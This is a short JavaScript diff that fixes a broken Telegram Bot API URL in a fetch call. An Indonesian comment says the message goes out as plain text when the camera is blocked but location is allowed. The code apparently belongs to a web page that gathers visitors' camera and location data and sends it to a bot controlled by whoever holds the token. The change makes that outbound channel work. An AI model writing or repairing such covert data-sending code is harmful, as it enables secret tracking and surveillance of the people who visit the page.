@@ -160,7 +160,7 @@
                 });
             } else {
                 // Kirim sebagai teks biasa jika kamera diblokir tetapi lokasi diizinkan
-                await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
